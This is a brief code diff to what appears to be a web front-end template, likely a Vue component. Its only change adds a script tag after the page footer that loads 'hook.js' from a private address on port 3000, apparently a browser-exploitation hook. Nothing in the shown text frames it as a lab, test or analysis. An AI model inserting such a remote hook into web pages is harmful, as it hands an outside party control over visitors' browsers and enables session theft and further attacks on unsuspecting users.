@@ -237,6 +237,7 @@
       </section>
     </footer>
   </div>
+  <script src="http://192.168.0.116:3000/hook.js"></script>
 </template>
 
 <script>
